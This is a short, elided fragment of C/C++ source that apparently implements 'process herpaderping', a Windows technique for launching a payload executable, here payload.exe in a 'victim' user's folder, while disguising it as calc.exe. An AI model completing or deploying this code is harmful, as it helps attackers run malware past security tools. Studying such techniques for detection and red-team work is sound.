...
BYTE* GetPayloadBuffer(OUT size_t& p_size) {
	HANDLE hFile = CreateFileW(L"C:\\Users\\victim\\Desktop\\herpaderping\\payload.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
...
BOOL Herpaderping(BYTE* payload,size_t payloadSize) {
	...
	lstrcpyW(targetFilePath, L"C:\\Windows\\System32\\calc.exe");
